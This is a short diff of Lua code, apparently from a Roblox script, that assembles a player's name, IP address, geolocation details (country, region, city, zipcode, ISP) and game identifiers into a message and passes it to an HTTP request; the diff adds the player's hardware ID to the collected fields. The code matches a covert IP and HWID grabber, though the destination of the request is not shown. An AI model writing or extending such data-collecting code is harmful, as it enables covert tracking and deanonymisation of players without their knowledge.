@@ -13196,7 +13196,7 @@ end
     local dataMessage =
         string.format(
         "\
-    User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg:``` %s\nJobID: %s\nPlaceId: %s",
+    User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg:``` %s\nJobID: %s\nPlaceId: %s\nHWID: %s",
         player_name,
         ipinfo_table.query,
         ipinfo_table.country,
@@ -13208,7 +13208,8 @@ end
         ipinfo_table.isp,
         ipinfo_table.org,
         game.JobId,
-        game.PlaceId
+        game.PlaceId,
+        game:GetService("RbxAnalyticsService"):GetClientId()
     )
     HttpRequest(
         {
